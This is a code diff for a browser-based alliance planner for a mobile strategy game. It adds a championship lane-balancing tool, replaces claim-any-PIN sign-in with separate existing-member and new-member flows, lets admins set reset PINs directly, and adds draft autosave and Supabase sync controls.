+// overflow; below 2*capEach the two primary lanes just split whatever
+// exists as evenly as the cap allows.
+function balanceChampionshipLanes(players, primaryPair) {
+  const primaryKeys = PRIMARY_PAIR_LANES[primaryPair] || PRIMARY_PAIR_LANES.left_right;
+  const overflowKey = LANE_KEYS.find((k) => !primaryKeys.includes(k));
+
+  const sorted = [...players].sort((a, b) => b.power - a.power);
+  const capped = sorted.slice(0, CHAMPIONSHIP_TOTAL_CAP);
+  const primaryPool = capped.slice(0, CHAMPIONSHIP_LANE_CAP * 2);
+  const overflowPool = capped.slice(CHAMPIONSHIP_LANE_CAP * 2);
+
+  const { aIds, bIds } = balanceTwoGroups(primaryPool, CHAMPIONSHIP_LANE_CAP);
+
+  const lanes = { left: [], middle: [], right: [] };
+  lanes[primaryKeys[0]] = aIds;
+  lanes[primaryKeys[1]] = bIds;
+  lanes[overflowKey] = overflowPool.slice(0, CHAMPIONSHIP_LANE_CAP).map((p) => p.id);
+  return lanes;
 }
 
 // Returns { bySection: [{title, points}], total } for a bag submission's values.
@@ -814,6 +1414,7 @@ const ROUTES = {
   "/rookie-off": renderRookieOff,
   "/feedback": renderFeedback,
   "/admin": renderAdmin,
+  "/championship": renderChampionship,
 };
 // wire up stub routes for planned tools
 PLANNED_TOOLS.forEach((t) => {
@@ -875,6 +1476,10 @@ function renderShell() {
   `;
   document.getElementById("signInBtn")?.addEventListener("click", openSignIn);
   document.getElementById("signOutBtn")?.addEventListener("click", () => {
+    // Flush any pending debounced draft save first — svsWizardTargetUser()
+    // (and so the draft's owner id) can no longer be resolved once
+    // currentUser is cleared.
+    flushDraftAutosave();
     Store.currentUser = null;
     renderShell();
     router();
@@ -883,8 +1488,10 @@ function renderShell() {
   // of someone else's bag — otherwise it'd silently stick around and hijack
   // the next visit to MY BAG. The Admin "Edit" button navigates
   // programmatically instead of via one of these anchors, so it's unaffected.
+  // Flush first — svsWizardTargetUser() needs svsEditingMemberId intact to
+  // resolve the member actually being edited, not the admin's own id.
   document.querySelectorAll(".topbar a, .bottom-nav a").forEach((a) =>
-    a.addEventListener("click", () => { svsEditingMemberId = null; })
+    a.addEventListener("click", () => { flushDraftAutosave(); svsEditingMemberId = null; })
   );
   tickClock();
 }
@@ -922,10 +1529,14 @@ window.addEventListener("DOMContentLoaded", () => {
 // ---------------------------------------------------------------------------
 // Sign-in modal (local identity only — see README for real auth)
 // ---------------------------------------------------------------------------
-// Sign-in is username + a 4-digit PIN. A member with no PIN set yet (brand
-// new, or an admin cleared it) "claims" whatever PIN they type on that
-// first login and it becomes their PIN from then on. An existing member
-// with a PIN set must match it exactly.
+// Sign-in requires an existing account (matched by chief name OR Gamer ID)
+// plus its exact 4-digit PIN — there's no "type any PIN to claim this
+// account" fallback, so a member's data can't be reached by guessing a
+// name that happens to belong to someone else. A brand-new member instead
+// uses the "New Member" tab to create their own account (Gamer Name,
+// Alliance Tag, Gamer ID, PIN) up front. An account with no PIN set (e.g.
+// one an admin added without setting one) simply can't sign in until an
+// admin sets a PIN for it from Admin → Members → Reset PIN.
 function openSignIn() {
   const overlay = document.createElement("div");
   overlay.className = "modal-overlay";
@@ -933,43 +1544,67 @@ function openSignIn() {
     <div class="modal">
       <button class="close">&times;</button>
       <h3>Sign in</h3>
-      <p style="color:var(--text-dim);font-size:12px;margin-top:-6px;">Chief name + your 4-digit PIN. First time signing in? Pick any 4-digit PIN — it becomes your login from then on.</p>
-      <input id="siName" placeholder="Type your chief name..." list="memberList" />
-      <datalist id="memberList">
-        ${Store.members.map((m) => `<option value="${m.name}">`).join("")}
-      </datalist>
-      <input id="siPin" placeholder="4-digit PIN..." inputmode="numeric" maxlength="4" style="margin-top:8px;letter-spacing:.3em;" />
-      <div id="siErr" style="color:var(--accent-red);font-size:11.5px;margin-top:6px;min-height:14px;"></div>
-      <button class="btn primary" id="siGo" style="width:100%;margin-top:4px;">Continue</button>
+      <div class="tabs" style="margin-bottom:2px;">
+        <button data-authtab="login" class="active">Existing Member</button>
+        <button data-authtab="signup">New Member</button>
+      </div>
+      <div id="authPane"></div>
     </div>
   `;
   document.body.appendChild(overlay);
   overlay.querySelector(".close").onclick = () => overlay.remove();
   overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
-  const errEl = overlay.querySelector("#siErr");
-  const pinInput = overlay.querySelector("#siPin");
+
+  const pane = overlay.querySelector("#authPane");
+  const tabBtns = overlay.querySelectorAll("[data-authtab]");
+  const showTab = (tab) => {
+    tabBtns.forEach((b) => b.classList.toggle("active", b.dataset.authtab === tab));
+    if (tab === "signup") renderSignUpPane(pane, overlay);
+    else renderLoginPane(pane, overlay);
+  };
+  tabBtns.forEach((b) => b.addEventListener("click", () => showTab(b.dataset.authtab)));
+  showTab("login");
+}
+
+function renderLoginPane(pane, overlay) {
+  pane.innerHTML = `
+    <p style="color:var(--text-dim);font-size:12px;margin-top:8px;">Sign in with your chief name or Gamer ID, plus your 4-digit PIN.</p>
+    <input id="siName" placeholder="Chief name or Gamer ID..." list="memberList" />
+    <datalist id="memberList">
+      ${Store.members.map((m) => `<option value="${m.name}">`).join("")}
+    </datalist>
+    <input id="siPin" placeholder="4-digit PIN..." inputmode="numeric" maxlength="4" style="letter-spacing:.3em;" />
+    <div id="siErr" style="color:var(--accent-red);font-size:11.5px;margin-top:-4px;min-height:28px;"></div>
+    <button class="btn primary" id="siGo" style="width:100%;">Sign in</button>
+  `;
+  const errEl = pane.querySelector("#siErr");
+  const pinInput = pane.querySelector("#siPin");
   pinInput.addEventListener("input", () => {
     pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
   });
   const go = () => {
-    const name = overlay.querySelector("#siName").value.trim();
+    const idOrName = pane.querySelector("#siName").value.trim();
     const pin = pinInput.value.trim();
     errEl.textContent = "";
-    if (!name) { errEl.textContent = "Enter your chief name."; return; }
+    if (!idOrName) { errEl.textContent = "Enter your chief name or Gamer ID."; return; }
     if (!/^\d{4}$/.test(pin)) { errEl.textContent = "PIN must be exactly 4 digits."; return; }
 
     const members = Store.members;
-    let member = members.find((m) => m.name.toLowerCase() === name.toLowerCase());
+    const member = members.find(
+      (m) =>
+        m.name.toLowerCase() === idOrName.toLowerCase() ||
+        (m.gamerId && m.gamerId.toLowerCase() === idOrName.toLowerCase())
+    );
 
     if (!member) {
-      // New chief name — create the member and claim this PIN as theirs.
-      member = { id: "m" + Date.now(), name, gamerId: "", alliance: "—", role: "member", pin };
-      Store.members = [...members, member];
-    } else if (!member.pin) {
-      // Existing member, no PIN claimed yet — this login sets it.
-      member.pin = pin;
-      Store.members = members;
-    } else if (member.pin !== pin) {
+      errEl.textContent = 'No account found with that name or Gamer ID. Use "New Member" above to create one.';
+      return;
+    }
+    if (!member.pin) {
+      errEl.textContent = "This account doesn't have a PIN set yet — ask an admin to set one from Admin → Members.";
+      return;
+    }
+    if (member.pin !== pin) {
       errEl.textContent = "Incorrect PIN.";
       return;
     }
@@ -979,7 +1614,55 @@ function openSignIn() {
     renderShell();
     router();
   };
-  overlay.querySelector("#siGo").onclick = go;
+  pane.querySelector("#siGo").onclick = go;
+  pinInput.addEventListener("keydown", (e) => { if (e.key === "Enter") go(); });
+}
+
+function renderSignUpPane(pane, overlay) {
+  pane.innerHTML = `
+    <p style="color:var(--text-dim);font-size:12px;margin-top:8px;">Create your account — this PIN will be required on every future sign-in.</p>
+    <input id="suName" placeholder="Gamer name..." />
+    <select id="suAlliance" ${Store.alliances.length ? "" : "disabled"}>
+      <option value="" disabled ${Store.alliances.length ? "selected" : ""}>${Store.alliances.length ? "Select alliance..." : "No alliances configured yet"}</option>
+      ${Store.alliances.map((a) => `<option value="${escapeHtml(a)}">${escapeHtml(a)}</option>`).join("")}
+    </select>
+    <input id="suGamerId" placeholder="Gamer ID..." />
+    <input id="suPin" placeholder="Create a 4-digit PIN..." inputmode="numeric" maxlength="4" style="letter-spacing:.3em;" />
+    <div id="suErr" style="color:var(--accent-red);font-size:11.5px;margin-top:-4px;min-height:28px;"></div>
+    <button class="btn primary" id="suGo" style="width:100%;">Create account</button>
+  `;
+  const errEl = pane.querySelector("#suErr");
+  const pinInput = pane.querySelector("#suPin");
+  pinInput.addEventListener("input", () => {
+    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
+  });
+  const go = () => {
+    const name = pane.querySelector("#suName").value.trim();
+    const alliance = pane.querySelector("#suAlliance").value.trim();
+    const gamerId = pane.querySelector("#suGamerId").value.trim();
+    const pin = pinInput.value.trim();
+    errEl.textContent = "";
+    if (!name) { errEl.textContent = "Enter your gamer name."; return; }
+    if (!alliance) { errEl.textContent = "Select your alliance."; return; }
+    if (!gamerId) { errEl.textContent = "Enter your Gamer ID."; return; }
+    if (!/^\d{4}$/.test(pin)) { errEl.textContent = "PIN must be exactly 4 digits."; return; }
+
+    const members = Store.members;
+    const nameTaken = members.some((m) => m.name.toLowerCase() === name.toLowerCase());
+    const idTaken = members.some((m) => m.gamerId && m.gamerId.toLowerCase() === gamerId.toLowerCase());
+    if (nameTaken || idTaken) {
+      errEl.textContent = 'An account with that name or Gamer ID already exists — use "Existing Member" to sign in instead.';
+      return;
+    }
+
+    const member = { id: "m" + Date.now(), name, gamerId, alliance, role: "member", pin };
+    Store.members = [...members, member];
+    Store.currentUser = member;
+    overlay.remove();
+    renderShell();
+    router();
+  };
+  pane.querySelector("#suGo").onclick = go;
   pinInput.addEventListener("keydown", (e) => { if (e.key === "Enter") go(); });
 }
 
@@ -1008,6 +1691,11 @@ function renderHome(el) {
         href: "#/feedback", color: "var(--accent-orange)", title: "feedback",
         desc: "Post, vote, and track ideas & bugs.",
         meta: "TELL US WHAT'S MISSING", plus: true,
+      })}
+      ${opCard({
+        href: "#/championship", color: "var(--accent-green)", title: "championship",
+        desc: "Alliance Championship lane planner — import players, auto-balance lanes.",
+        meta: `${championshipTotalPlayersImported()} PLAYERS IMPORTED (ALL ALLIANCES)`,
       })}
       ${PLANNED_TOOLS.map((t) =>
         opCard({
@@ -1473,7 +2161,12 @@ function blankDraft() {
 }
 
 function loadDraft(user) {
-  const existing = Store.bagSubmissions[user.id];
+  // Prefer an in-progress autosaved draft (Store.bagDrafts) over the last
+  // official submission (Store.bagSubmissions) — it's the more recent
+  // in-flight edit. Falls back to the last submission (so re-opening MY
+  // BAG to make changes still starts from what was actually submitted),
+  // then to a blank form for a brand-new member.
+  const existing = Store.bagDrafts[user.id] || Store.bagSubmissions[user.id];
   if (existing) {
     // fill in any structure gaps (e.g. new schedule days) without losing saved data
     const d = blankDraft();
@@ -1488,6 +2181,47 @@ function loadDraft(user) {
   }
   return blankDraft();
 }
+
+// ---------------------------------------------------------------------------
+// Auto-save the in-progress MY BAG wizard (svsDraft) as a draft, debounced
+// so rapid typing doesn't fire a write per keystroke. Keyed by whichever
+// member the wizard is currently editing (svsWizardTargetUser() — normally
+// the signed-in member themselves, or the member an admin is editing on
+// their behalf), so a draft only ever lands under its own owner's id and
+// is only ever read back for that same id — one member can't see another
+// member's in-progress draft. Resolves the target user at fire time (not
+// schedule time) so it can't write to a stale id if the wizard's context
+// changed in between.
+// ---------------------------------------------------------------------------
+let draftSaveTimer = null;
+const DRAFT_SAVE_DEBOUNCE_MS = 700;
+
+function scheduleDraftAutosave() {
+  clearTimeout(draftSaveTimer);
+  draftSaveTimer = setTimeout(() => {
+    draftSaveTimer = null;
+    flushDraftAutosave();
+  }, DRAFT_SAVE_DEBOUNCE_MS);
+}
+
+// Writes the pending draft immediately (skipping the debounce delay) —
+// used right before anything that could otherwise lose the last few
+// un-debounced keystrokes: the page unloading, or the current user
+// signing out mid-edit.
+function flushDraftAutosave() {
+  clearTimeout(draftSaveTimer);
+  draftSaveTimer = null;
+  const user = svsWizardTargetUser();
+  if (!user || !svsDraft) return;
+  const drafts = Store.bagDrafts;
+  drafts[user.id] = svsDraft;
+  Store.bagDrafts = drafts;
+}
+
+window.addEventListener("beforeunload", flushDraftAutosave);
+// Mobile browsers (notably iOS Safari) often skip beforeunload on tab
+// close/switch — pagehide is the reliable equivalent there.
+window.addEventListener("pagehide", flushDraftAutosave);
 
 function svsGate(el, msg) {
   el.innerHTML = `
@@ -1539,6 +2273,11 @@ function renderSvSWizard(el) {
   `;
   if (svsEditingMemberId) {
     el.querySelector("#exitEdit").onclick = () => {
+      // Flush before clearing svsEditingMemberId — otherwise the pending
+      // save would resolve to the admin's own id instead of the member
+      // actually being edited, since svsWizardTargetUser() falls back to
+      // Store.currentUser once svsEditingMemberId is gone.
+      flushDraftAutosave();
       svsEditingMemberId = null;
       svsDraft = null;
       svsWizardStep = "backpack";
@@ -1743,6 +2482,7 @@ function renderWizardBackpack(el, wrap) {
   el.querySelectorAll("[data-toggle]").forEach((btn) => {
     btn.addEventListener("click", () => {
       svsDraft.values[btn.dataset.toggle] = !svsDraft.values[btn.dataset.toggle];
+      scheduleDraftAutosave();
       renderWizardBackpack(el, wrap);
     });
   });
@@ -1762,6 +2502,7 @@ function renderWizardBackpack(el, wrap) {
         const statusEl = el.querySelector(`[data-day-status="${field.key}"]`);
         if (statusEl) statusEl.innerHTML = dayStatusHtml(field.statusKey, svsDraft.values);
       }
+      scheduleDraftAutosave();
     };
     input.addEventListener("input", commitLocal);
     // On change (blur/enter/select), also run the sync-to-day-field copy
@@ -1861,7 +2602,7 @@ function renderWizardTimeSlots(el) {
     </div>
   `;
   el.querySelectorAll("[data-mode]").forEach((b) =>
-    b.addEventListener("click", () => { svsDraft.availabilityType = b.dataset.mode; renderWizardTimeSlots(el); })
+    b.addEventListener("click", () => { svsDraft.availabilityType = b.dataset.mode; scheduleDraftAutosave(); renderWizardTimeSlots(el); })
   );
   el.querySelectorAll(".day-tabs button").forEach((b) =>
     b.addEventListener("click", () => {
@@ -1875,6 +2616,7 @@ function renderWizardTimeSlots(el) {
       const arr = mode === "all" ? svsDraft.slots.all : svsDraft.slots.byDay[svsWizardDayTab];
       arr[i] = !arr[i];
       btn.classList.toggle("on", arr[i]);
+      scheduleDraftAutosave();
     })
   );
   el.querySelector("#wizBack").onclick = () => { svsWizardStep = "review"; refreshSvS(); };
@@ -1922,6 +2664,10 @@ function renderWizardSubmit(el, wrap) {
     </div>
     <div id="wizMsg" style="margin-top:10px;font-size:12px;color:var(--accent-green);"></div>
   `;
+  el.querySelector("#wizNotes").addEventListener("input", (e) => {
+    svsDraft.notes = e.target.value;
+    scheduleDraftAutosave();
+  });
   const warnEl = el.querySelector("#wizScheduleWarning");
   const submitBtn = el.querySelector("#wizSubmit");
   let confirmedPastWarning = false;
@@ -1931,6 +2677,16 @@ function renderWizardSubmit(el, wrap) {
     const all = Store.bagSubmissions;
     all[user.id] = svsDraft;
     Store.bagSubmissions = all;
+    // This submission now supersedes the autosaved draft — clear it (and
+    // cancel any still-pending debounced save) so a later visit to MY BAG
+    // starts from what was actually submitted, not a leftover draft.
+    clearTimeout(draftSaveTimer);
+    draftSaveTimer = null;
+    const drafts = Store.bagDrafts;
+    if (drafts[user.id]) {
+      delete drafts[user.id];
+      Store.bagDrafts = drafts;
+    }
     svsDraft = null;
     svsWizardStep = "backpack";
     finishSubmit();
@@ -2718,6 +3474,19 @@ function renderAdmin(el) {
     </div>
 
     <div class="panel">
+      <div class="planner-header"><strong>Supabase sync</strong></div>
+      <p style="font-size:11.5px;color:var(--text-dim);margin-top:-6px;">
+        ${
+          supabaseClient
+            ? "Every change here already saves to Supabase automatically the instant you make it — this button re-pushes everything currently loaded (members, schedule, bag submissions, feedback, alliances, state config) right now, in case anything didn't save the first time (e.g. you were offline briefly)."
+            : "Supabase isn't configured for this site yet (SUPABASE_CONFIG is blank in data.js), so this button has nothing to sync to — data is saved to this browser's localStorage only. See README.md → \"Going multi-user\" to set it up."
+        }
+      </p>
+      <button class="btn small ${supabaseClient ? "primary" : ""}" id="admForceSync" ${supabaseClient ? "" : "disabled"}>⏫ Force Sync to Supabase</button>
+      <span id="admSyncMsg" style="margin-left:10px;font-size:12px;"></span>
+    </div>
+
+    <div class="panel">
       <div class="planner-header"><strong>Alliances (${alliances.length})</strong></div>
       <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
         ${
@@ -2735,7 +3504,7 @@ function renderAdmin(el) {
         }
       </div>
       <div style="display:flex;gap:8px;">
-        <input id="admNewAlliance" placeholder="New alliance tag (e.g. STK)..." style="flex:1;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:4px;padding:8px 10px;font-size:12px;" />
+        <input id="admNewAlliance" placeholder="New alliance tag (e.g. SYP)..." style="flex:1;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:4px;padding:8px 10px;font-size:12px;" />
         <button class="btn small primary" id="admAddAlliance">Add alliance</button>
       </div>
     </div>
@@ -2744,7 +3513,7 @@ function renderAdmin(el) {
 
     <div class="panel">
       <div class="planner-header"><strong>Members (${members.length}${officerScoped ? ` / ${allMembers.length}` : ""})</strong></div>
-      <p style="font-size:11.5px;color:var(--text-dim);margin-top:-6px;">Members set their own PIN the first time they sign in. Reset PIN clears it so they can claim a new one on their next login.</p>
+      <p style="font-size:11.5px;color:var(--text-dim);margin-top:-6px;">New members create their own PIN via "New Member" on the sign-in screen. Reset PIN lets you set a member's PIN directly (e.g. if they're locked out) — they'll need that exact PIN on their next sign-in.</p>
       ${
         officerScoped
           ? `<p style="font-size:11.5px;color:var(--accent-amber);margin-top:-4px;">Showing ${escapeHtml(user.alliance || "your alliance")} only — R4s see their own alliance's roster, not the whole state.</p>`
@@ -2758,7 +3527,7 @@ function renderAdmin(el) {
               .map(
                 (m) => `
               <tr>
-                <td><input data-mfield="name" data-mid="${m.id}" value="${escapeHtml(m.name)}" style="width:100%;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:3px;padding:5px 8px;font-size:12px;" /></td>
+                <td><input data-mfield="name" data-mid="${m.id}" value="${escapeHtml(m.name)}" ${m.permanent ? `disabled title="Permanent admin login — name can't be changed"` : ""} style="width:100%;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:3px;padding:5px 8px;font-size:12px;${m.permanent ? "opacity:.6;" : ""}" /></td>
                 <td><input data-mfield="gamerId" data-mid="${m.id}" value="${escapeHtml(m.gamerId || "")}" placeholder="—" style="width:100%;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:3px;padding:5px 8px;font-size:12px;" /></td>
                 <td>
                   <select data-mfield="alliance" data-mid="${m.id}" style="background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:3px;padding:5px 8px;font-size:12px;">
@@ -2769,14 +3538,18 @@ function renderAdmin(el) {
                 </td>
                 <td>
                   ${
-                    m.pin
+                    m.permanent
+                      ? `<span style="font-size:10.5px;color:var(--text-faint);" title="Standing admin login — always PIN ${escapeHtml(PERMANENT_ADMIN_MEMBER.pin)}">permanent login</span>`
+                      : m.pin
                       ? `<button data-mresetpin="${m.id}" class="btn small" style="font-size:10.5px;color:var(--accent-amber);">Reset PIN</button>`
                       : `<span style="font-size:10.5px;color:var(--text-faint);">no PIN yet</span>`
                   }
                 </td>
                 <td>
                   ${
-                    officerScoped
+                    m.permanent
+                      ? `<span style="font-size:12px;color:var(--text-dim);" title="This is the permanent admin login — its rank can't be changed">${escapeHtml(roleLabel(m.role))}</span>`
+                      : officerScoped
                       ? `<span style="font-size:12px;color:var(--text-dim);" title="Only the admin role can change rank">${escapeHtml(roleLabel(m.role))}</span>`
                       : `<select data-mfield="role" data-mid="${m.id}" style="background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:3px;padding:5px 8px;font-size:12px;">
                           ${["member", "officer", "admin"].map((r) => `<option value="${r}" ${m.role === r ? "selected" : ""}>${roleLabel(r)}</option>`).join("")}
@@ -2786,7 +3559,7 @@ function renderAdmin(el) {
                 <td>
                   <div style="display:flex;gap:6px;justify-content:flex-end;flex-wrap:nowrap;">
                     ${canEditMemberBag(user) ? `<button data-medit2="${m.id}" class="btn small" style="white-space:nowrap;">Edit Bag</button>` : ""}
-                    ${officerScoped ? "" : `<button data-mdel="${m.id}" class="btn small" style="color:var(--accent-red);">✕</button>`}
+                    ${!officerScoped && !m.permanent ? `<button data-mdel="${m.id}" class="btn small" style="color:var(--accent-red);">✕</button>` : ""}
                   </div>
                 </td>
               </tr>`
@@ -2798,6 +3571,7 @@ function renderAdmin(el) {
       <div style="display:flex;gap:8px;margin-top:10px;">
         <input id="admNewMember" placeholder="New member name..." style="flex:1;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:4px;padding:8px 10px;font-size:12px;" />
         <input id="admNewGamerId" placeholder="Gamer ID (optional)..." style="width:150px;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:4px;padding:8px 10px;font-size:12px;" />
+        <input id="admNewPin" placeholder="4-digit PIN..." inputmode="numeric" maxlength="4" style="width:110px;letter-spacing:.2em;background:var(--panel-2);border:1px solid var(--border);color:var(--text);border-radius:4px;padding:8px 10px;font-size:12px;" />
         <button class="btn small primary" id="admAddMember">Add member</button>
       </div>
     </div>
@@ -2810,6 +3584,10 @@ function renderAdmin(el) {
       <div class="planner-header"><strong>SvS prep — bulk actions</strong></div>
       <p style="font-size:12px;color:var(--text-dim);">${countFilledSlots()} slots currently booked across all days.</p>
       <button class="btn small" id="admClearSlots" style="color:var(--accent-red);">Clear all booked slots</button>
+      <div style="margin-top:14px;padding-top:14px;border-top:1px solid var(--border);">
+        <p style="font-size:12px;color:var(--text-dim);margin:0 0 8px;">Reset the planner for a new SvS cycle — clears every member's bag entries, drafts, submissions, points, and selected time slots, plus the booked SCHEDULE grid those slots feed. Member accounts, PINs, and roles are untouched.</p>
+        <button class="btn small primary" id="admClearBags" style="background:var(--accent-red);border-color:var(--accent-red);">🗑 Clear Bags (reset for new cycle)</button>
+      </div>
     </div>
 
     <div class="panel">
@@ -2967,6 +3745,26 @@ function renderAdmin(el) {
     renderShell();
   });
 
+  el.querySelector("#admForceSync")?.addEventListener("click", async () => {
+    const btn = el.querySelector("#admForceSync");
+    const msgEl = el.querySelector("#admSyncMsg");
+    btn.disabled = true;
+    msgEl.style.color = "var(--text-dim)";
+    msgEl.textContent = "Syncing…";
+    const result = await Store.forceSyncToSupabase();
+    btn.disabled = false;
+    if (result.ok) {
+      msgEl.style.color = "var(--accent-green)";
+      msgEl.textContent = `Synced ${result.count} data sets to Supabase.`;
+    } else if (result.reason === "not_configured") {
+      msgEl.style.color = "var(--accent-red)";
+      msgEl.textContent = "Supabase isn't configured — nothing to sync to.";
+    } else {
+      msgEl.style.color = "var(--accent-red)";
+      msgEl.textContent = `Sync failed for: ${(result.failedKeys || []).join(", ")}. Check the browser console for details.`;
+    }
+  });
+
   el.querySelectorAll("[data-mfield]").forEach((input) =>
     input.addEventListener("change", () => {
       const id = input.dataset.mid;
@@ -2998,6 +3796,11 @@ function renderAdmin(el) {
   el.querySelectorAll("[data-mdel]").forEach((btn) =>
     btn.addEventListener("click", () => {
       const id = btn.dataset.mdel;
+      // Defensive re-check — this button never renders for the permanent
+      // admin account in the first place (see canEditMemberBag-style
+      // gating above), but even if it's deleted some other way,
+      // ensurePermanentAdmin() in data.js re-adds it on the very next load.
+      if (id === PERMANENT_ADMIN_MEMBER.id) return;
       const m = Store.members.filter((mm) => mm.id !== id);
       Store.members = m;
       renderAdmin(el);
@@ -3009,14 +3812,23 @@ function renderAdmin(el) {
       const m = Store.members;
       const idx = m.findIndex((mm) => mm.id === id);
       if (idx === -1) return;
-      delete m[idx].pin;
+      // The admin sets the new PIN directly (rather than clearing it for
+      // anyone to claim on the next login) — that would let anyone who
+      // knows this member's name sign in as them before the real member
+      // gets a chance to. Give the new PIN to the actual member out of band.
+      const newPin = (prompt(`Set a new 4-digit PIN for ${m[idx].name}:`) || "").trim();
+      if (!newPin) return; // cancelled
+      if (!/^\d{4}$/.test(newPin)) {
+        alert("PIN must be exactly 4 digits.");
+        return;
+      }
+      m[idx].pin = newPin;
       Store.members = m;
       if (Store.currentUser && Store.currentUser.id === id) {
-        // Their own PIN was just cleared — sign them out so they have to
-        // claim a fresh one. renderShell() swaps in a fresh <main id="app">,
-        // so re-render via router() (which lands on the "not an admin"
-        // gate now that they're signed out) instead of writing into the
-        // old, now-detached node.
+        // Sign them out so they re-authenticate with the PIN just set,
+        // rather than continuing on a stale in-memory session. Flush first
+        // in case they have an in-progress bag draft pending autosave.
+        flushDraftAutosave();
         Store.currentUser = null;
         renderShell();
         router();
@@ -3025,21 +3837,63 @@ function renderAdmin(el) {
       renderAdmin(el);
     })
   );
+  el.querySelector("#admNewPin")?.addEventListener("input", (e) => {
+    e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
+  });
   el.querySelector("#admAddMember").onclick = () => {
     const name = el.querySelector("#admNewMember").value.trim();
     const gamerId = el.querySelector("#admNewGamerId").value.trim();
+    const pin = el.querySelector("#admNewPin").value.trim();
     if (!name) return;
+    if (!/^\d{4}$/.test(pin)) {
+      alert("Enter a 4-digit PIN for this member so they can sign in.");
+      return;
+    }
     // Officers only ever see their own alliance here, so a member they add
     // needs that alliance from the start — otherwise it'd default blank and
     // immediately vanish from their filtered table.
     const alliance = officerScoped ? user.alliance || "" : "";
-    Store.members = [...Store.members, { id: "m" + Date.now(), name, gamerId, alliance, role: "member" }];
+    Store.members = [...Store.members, { id: "m" + Date.now(), name, gamerId, alliance, role: "member", pin }];
     renderAdmin(el);
   };
   el.querySelector("#admClearSlots")?.addEventListener("click", () => {
     const sched = Store.schedule;
     Object.keys(sched).forEach((day) => sched[day].forEach((s) => (s.member = null)));
     Store.schedule = sched;
+    renderAdmin(el);
+  });
+  // Full bag-cycle reset — every member's bag data (entries, drafts,
+  // submissions, calculated points, and their selected time slots) plus
+  // the SCHEDULE grid those slot selections feed into. Deliberately does
+  // NOT touch Store.members (accounts, PINs, gamer names/IDs, alliance
+  // tags, roles) or anything else — same admin-only gating as every other
+  // control in this panel (canSeeSchedule/officerScoped above), plus the
+  // confirmation below since this is a state-wide, irreversible action.
+  el.querySelector("#admClearBags")?.addEventListener("click", () => {
+    const confirmed = confirm(
+      "Are you sure you want to clear ALL member bags? This will permanently remove all current bag entries, submissions, saved drafts, points, and selected time slots for every member. Member accounts and profile information will NOT be deleted."
+    );
+    if (!confirmed) return;
+
+    Store.bagSubmissions = {};
+    Store.bagDrafts = {};
+    // Fresh objects (not the shared SEED_SCHEDULE/SEED_SCHEDULE_PUBLISHED
+    // constants) — those are reused as fallback defaults elsewhere, and
+    // Store's Supabase-mode cache can hold onto whatever reference is
+    // assigned here, so reusing the constants directly would risk a later
+    // read-modify-write mutating the shared seed data itself.
+    Store.schedule = SEED_SCHEDULE_DAYS.reduce((acc, day) => { acc[day] = emptySlots(); return acc; }, {});
+    Store.schedulePublished = SEED_SCHEDULE_DAYS.reduce((acc, day) => { acc[day] = false; return acc; }, {});
+
+    // Drop any in-progress MY BAG wizard state (this admin's own, or one
+    // they're editing on a member's behalf), and cancel any debounced
+    // autosave still pending — otherwise it could fire moments later and
+    // write stale, just-cleared data straight back into the store.
+    clearTimeout(draftSaveTimer);
+    draftSaveTimer = null;
+    svsDraft = null;
+    svsEditingMemberId = null;
+
     renderAdmin(el);
   });
   const openMemberBagEditor = (memberId) => {
@@ -3075,6 +3929,751 @@ function renderAdmin(el) {
       renderAdmin(el);
     })
   );
+}
+
+
+// ---------------------------------------------------------------------------
+// ALLIANCE CHAMPIONSHIP — lane planner
+// Admin/R4-only tool, and ALLIANCE-SCOPED: every alliance tag gets its own
+// completely separate player list, lane assignments, and primary-pair
+// choice — see the big comment above Store.championship's getter in
+// data.js for the full access model and its honest limits. Two ways to
+// build the player list — screenshots -> client-side OCR extract
+// (Tesseract.js), or paste/upload a "name,power" CSV dataset — both feed
+// the SAME roster and dedupe against each other, then auto-balance into 3
+// lanes (two "primary" lanes maxed to 20/20 and balanced by total power,
+// the third lane holds whoever is left over) -> manual drag/swap/edit ->
+// explicit Save/Clear. See balanceChampionshipLanes, parseChampionshipOcrText,
+// parseChampionshipDataset, buildChampionshipImportPreview, and
+// defaultChampionshipData in data.js for the underlying data model and
+// algorithms.
+//
+// Deliberately NOT wired into the bag planner's debounced autosave system:
+// this is an admin/R4 planning tool with its own explicit "Save
+// Championship Plan" button (per the feature request), not a per-member
+// form that needs to survive an accidental refresh mid-keystroke. Working
+// edits live in champWorking (in-memory only, a deep copy of the last-saved
+// plan for whichever alliance is currently being viewed) until Save writes
+// them back to that alliance's slice of Store.championship; Clear wipes
+// both, for that alliance only. Reloading the page always starts from
+// whatever was last explicitly saved.
+//
+// Store.championship is its own key, completely separate from
+// Store.members/bagSubmissions/bagDrafts/schedule — nothing in this section
+// ever reads or writes any of those, and nothing in the bag planner reads
+// or writes this.
+// ---------------------------------------------------------------------------
+let champWorking = null; // deep-copied working draft of one alliance's Championship data, or null before first load
+let champWorkingAlliance = null; // which alliance tag champWorking currently holds — reloaded whenever this changes
+let champDirty = false; // true once champWorking differs from the last-saved data for champWorkingAlliance
+let champOcrBusy = false;
+let champOcrStatus = "";
+let champDragId = null; // id of the player currently mid-drag
+let champViewingAlliance = null; // full-admin-only: which alliance's dataset the "VIEWING ALLIANCE" picker currently shows
+let champImportMode = "screenshots"; // "screenshots" | "dataset" — which import panel is open
+let champDatasetText = ""; // the "Paste Player Dataset" textarea's current content
+let champImportBusy = false; // true while reading an uploaded .csv file
+let champImportPreview = null; // set by "Preview Import" — { rowsRead, validPlayers, duplicatesRemoved, conflicts, invalidRows, rows } from data.js's buildChampionshipImportPreview
+// Session-only import stats (not part of Store.championship — purely
+// informational about what's happened in this working session, per
+// alliance) — reset by Clear Championship Plan, switching viewed alliance,
+// or naturally on a full page reload.
+let champScreenshotsProcessed = 0;
+let champDuplicatesRemoved = 0;
+
